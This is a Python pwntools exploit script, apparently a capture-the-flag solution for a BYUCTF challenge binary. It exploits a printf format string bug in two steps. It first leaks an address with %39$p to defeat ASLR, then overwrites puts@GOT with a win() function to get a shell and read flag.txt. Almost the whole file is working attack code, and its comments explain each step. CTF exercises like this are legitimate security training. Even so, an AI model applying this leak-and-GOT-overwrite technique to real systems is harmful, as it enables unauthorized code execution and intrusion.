from pwn import *

# PIE binary, two "flag guess" prompts, both passed directly to printf(user_input).
# Format string vulnerability on both attempts.
#
# Attempt 1: leak stack value with %39$p -> return address into main.
#   exe_base = leak - 0x5c9
#   win_addr = exe_base + 0x53c
#   puts_got = exe_base + 0x3018
#
# Attempt 2: fmtstr_payload writes win_addr to puts@GOT (offset 20, short writes).
#   Payload must stay <= 99 bytes. Whitespace bytes in addresses break the write;
#   reconnect until ASLR gives a clean base.
#
# After GOT overwrite, puts() resolves to win() -> shell.
#
# Remote runs in pwn.red/jail (see Dockerfile: JAIL_TIME=60, JAIL_MEM=20M).
#
# checksec: Partial RELRO, NX, no canary, PIE enabled.


def solve():
    if args.LOCAL:
        r = process("./intro")
    else:
        r = remote("chals.cyberjousting.com", 1367)

    r.recvuntil(b"Attempt 1: ")
    r.sendline(b"%39$p")

    r.recvuntil(b"Incorrect flag: ")
    leak = r.recvuntil(b".", drop=True)
    try:
        main_addr = int(leak, 16)
    except:
        print("Failed to parse leak")
        r.close()
        return False
    print(f"[+] Leaked main(): {hex(main_addr)}")

    exe_base = main_addr - 0x5C9
    win_addr = exe_base + 0x53C
    puts_got = exe_base + 0x3018

    if b" " in p64(puts_got) or b"\t" in p64(puts_got) or b"\n" in p64(puts_got):
        print("[-] Bad ASLR base (whitespace in GOT address). Retrying...")
        r.close()
        return False

    print(f"[+] Exe base: {hex(exe_base)}")
    print(f"[+] puts@got: {hex(puts_got)}")
    print(f"[+] win(): {hex(win_addr)}")

    context.arch = "amd64"
    bad_bytes = b"\x09\x0a\x0b\x0c\x0d\x20"
    try:
        payload = fmtstr_payload(20, {puts_got: win_addr}, write_size="short", badbytes=bad_bytes)
    except Exception:
        print("[-] Bad ASLR base for fmtstr_payload. Retrying...")
        r.close()
        return False

    print(f"[+] Payload length: {len(payload)}")
    if len(payload) > 99:
        print("[-] Payload too long!")
        r.close()
        return False

    r.recvuntil(b"Attempt 2: ")
    r.sendline(payload)

    r.sendline(b"cat flag.txt; exit")

    try:
        output = r.recvall(timeout=2).decode(errors="ignore")
        if "byuctf{" in output:
            flag = "byuctf{" + output.split("byuctf{")[1].split("}")[0] + "}"
            print(f"\n[+] Flag: {flag}")
            return True
    except Exception as e:
        print(f"Exception: {e}")
        pass

    r.close()
    return False


if __name__ == "__main__":
    while not solve():
        pass
